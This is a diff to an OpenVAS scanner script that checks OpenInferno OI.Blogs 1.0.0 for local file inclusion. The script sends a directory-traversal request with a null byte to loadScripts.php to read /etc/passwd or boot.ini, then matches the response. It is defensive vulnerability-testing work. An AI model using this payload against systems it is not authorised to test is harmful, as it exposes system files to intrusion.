@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: OpenInferno_38402.nasl 5394 2017-02-22 09:22:42Z teissa $
+# $Id: OpenInferno_38402.nasl 5760 2017-03-29 10:24:17Z cfi $
 #
 # OpenInferno OI.Blogs Multiple Local File Include Vulnerabilities
 #
@@ -37,24 +37,21 @@ attacks are also possible.
 OpenInferno OI.Blogs 1.0.0 is vulnerable; other versions may also
 be affected.";
 
-
 if (description)
 {
  script_id(100508);
- script_version("$Revision: 5394 $");
- script_tag(name:"last_modification", value:"$Date: 2017-02-22 10:22:42 +0100 (Wed, 22 Feb 2017) $");
+ script_version("$Revision: 5760 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 12:24:17 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2010-02-26 12:01:21 +0100 (Fri, 26 Feb 2010)");
  script_bugtraq_id(38402);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("OpenInferno OI.Blogs Multiple Local File Include Vulnerabilities");
-
-
  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl", "http_version.nasl");
+ script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name : "summary" , value : tag_summary);
@@ -66,37 +63,32 @@ if (description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
-   
+include("host_details.inc");
+
 port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
 if(!can_host_php(port:port))exit(0);
 
-dirs = make_list("/blog","/oi",cgi_dirs());
-files = make_list("etc/passwd","boot.ini");
+files = traversal_files();
 
-foreach dir (dirs) {
-   
-  url = string(dir, "/index.php"); 
-  req = http_get(item:url, port:port);
-  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);  
+foreach dir( make_list_unique( "/blog", "/oi", cgi_dirs( port:port ) ) ) {
+
+  if( dir == "/" ) dir = "";
+  url = dir + "/index.php";
+  buf = http_get_cache( item:url, port:port );
   if( buf == NULL )continue;
 
   if(egrep(pattern: "Powered By (OI.Blog|OpenInferno)", string: buf, icase: TRUE)) {
-    foreach file (files) {
-      
-      url = string(dir, "/sources/javascript/loadScripts.php?scripts=/../../../../../../../../../../../../../../../", file,"%00");
-      req = http_get(item:url, port:port);
-      buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
-      if(egrep(pattern:"(root:.*:0:[01]:|\[boot loader\])", string: buf)) {
+    foreach file (keys(files)) {
 
-        security_message(port:port);
-        exit(0);
-      
+      url = string(dir, "/sources/javascript/loadScripts.php?scripts=/../../../../../../../../../../../../../../../",files[file],"%00");
+      if(http_vuln_check(port:port, url:url,pattern:file)) {
+        report = report_vuln_url( port:port, url:url );
+        security_message( port:port, data:report );
+        exit( 0 );
       }
     }
   }
 }
 
-exit(0);
+exit( 99 );
